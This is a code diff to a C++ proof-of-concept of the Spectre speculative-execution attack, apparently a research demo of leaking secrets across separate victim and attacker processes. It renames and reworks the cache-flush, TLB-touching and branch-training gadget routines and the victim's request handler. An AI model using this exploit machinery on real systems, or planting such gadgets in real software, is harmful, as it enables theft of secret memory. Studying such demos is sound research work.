@@ -6,8 +6,8 @@
 * "Spectre Attacks: Exploiting Speculative Execution" paper found at
 * https://spectreattack.com/spectre.pdf
 *
-* Modifications have been made by Luke McHale to demonstrate Spectre
-* across seperate victim and attacker processes.
+* Significant modifications have been made by Luke McHale to demonstrate
+*  Spectre across seperate victim and attacker processes.
 *
 **********************************************************************/
 
@@ -247,7 +247,7 @@ inline void flush_array2() {
 }
 
 
-inline void flush_condition() {
+inline void gadget_flush_condition() {
 #ifndef NOCLFLUSH
       _mm_clflush( &array1_size );
 #else
@@ -268,43 +268,27 @@ inline void flush_condition() {
 }
 
 
-inline bool touch_secret(size_t i = 0) {
-  volatile static uint8_t tmp;
-
-  // Fill TLB with entry correspoding to each secret:
-  // -- side effect: pulls first cache line of each page into cache.
-  const uint8_t* page1 = reinterpret_cast<uint8_t*>(
-        ( (size_t)(&secret_heap[i]) ) & ~(PAGE_SIZE-1) );
-  const uint8_t* page2 = reinterpret_cast<uint8_t*>(
-        ( (size_t)(&secret_global[i]) ) & ~(PAGE_SIZE-1) );
-  const uint8_t* page3 = reinterpret_cast<uint8_t*>(
-        ( (size_t)(&secret_stack[i]) ) & ~(PAGE_SIZE-1) );
-  tmp ^= *page1 ^ *page2 ^ *page3;
-  return tmp == 0;  // unsued return
-}
-
-
-inline bool touch_va(size_t va) {
+inline bool gadget_touch_va(const size_t va) {
   volatile static uint8_t tmp;
 
   // Fill TLB with entry correspoding to va:
   // -- side effect: pulls first cache line of page into cache.
-  const uint8_t* page = reinterpret_cast<uint8_t*>(va & ~(PAGE_SIZE-1));
-  printf("Touching TLB page with 1 byte load at VA: %p\n", page);
+  const uint8_t* page = reinterpret_cast<const uint8_t*>(va & ~(PAGE_SIZE-1));
+  printf(" -touching page for TLB with 1 byte load at VA: %p\n", page);
 
   tmp ^= *page;
   return tmp == 0;  // unsued return
 }
 
 
-inline bool touch_page(size_t x) {
+inline bool gadget_touch_page(const size_t x) {
   volatile static uint8_t tmp;
 
   // Calculate pointer to first byte in page:
   // - mimics array1-relative addressing for simplicity...
-  const uint8_t* page = reinterpret_cast<uint8_t*>(
+  const uint8_t* page = reinterpret_cast<const uint8_t*>(
         reinterpret_cast<size_t>(&array1[x]) & ~(PAGE_SIZE-1));
-  printf("Touching TLB page with 1 byte load at VA: %p\n", page);
+  printf("- touching page for TLB with 1 byte load at VA: %p\n", page);
 
   // Fill TLB with entry correspoding to x:
   // - side effect: pulls first cache line of page into cache
@@ -313,12 +297,28 @@ inline bool touch_page(size_t x) {
 }
 
 
+inline bool gadget_touch_secrets(size_t i = 0) {
+  volatile uint8_t tmp;
+
+  // Fill TLB with entry correspoding to each secret:
+  // -- side effect: pulls first cache line of each page into cache.
+  const size_t page1 = reinterpret_cast<size_t>(&secret_heap[i])   & ~(PAGE_SIZE-1);
+  const size_t page2 = reinterpret_cast<size_t>(&secret_global[i]) & ~(PAGE_SIZE-1);
+  const size_t page3 = reinterpret_cast<size_t>(&secret_stack[i])  & ~(PAGE_SIZE-1);
+
+  tmp = gadget_touch_va(page1);
+  tmp &= gadget_touch_va(page2);
+  tmp &= gadget_touch_va(page3);
+  return tmp;
+}
+
+
 void helper(size_t malicious_x, size_t training_x = 0) {
-  touch_secret(); // ensures secret is cached (optional?)
+  gadget_touch_secrets(); // ensures secret is cached (optional?)
 
   /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
   for (int j = 29; j >= 0; j--) {
-    flush_condition();  // ensures speculation occurs (optional?)
+    gadget_flush_condition();  // ensures speculation occurs (optional?)
 
     /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
     /* Avoid jumps in case those tip off the branch predictor */
@@ -336,8 +336,7 @@ void helper(size_t malicious_x, size_t training_x = 0) {
 
 
 void helper_simple(size_t x) {
-//  touch_secret(); // ensures secret is cached (optional?)
-  flush_condition();  // Critical to allow speculation!
+  gadget_flush_condition();  // Critical to allow speculation!
 
   /* Call the victim function! */
   victim_function(x);
@@ -411,19 +410,23 @@ void recv_worker_v2(uint16_t port) {
 #ifdef DEBUG
         std::cout << "Calling helper_simple("<<x<<")" << std::endl;
 #endif
-        helper_simple(x);
+//        helper_simple(x);
+        victim_function(x);
         break;
       case FN_EVICT_CONDITION:
+#ifdef DEBUG
         std::cout << "Emulating gadget: flush_condition()" << std::endl;
-        flush_condition();
+#endif
+        gadget_flush_condition();
         break;
       case FN_TOUCH_SECRET:
         std::cout << "Emulating gadget: touch_secret("<<x<<")" << std::endl;
-        touch_secret(x);
+//        touch_secret(x);
+        gadget_touch_secrets(x);
         break;
       case FN_TOUCH_PAGE:
         std::cout << "Emulating gadget: touch_page("<<x<<")" << std::endl;
-        touch_page(x);
+        gadget_touch_page(x);
         break;
       default:
         std::cerr << "Unexpected operation requested: " << fn << std::endl;
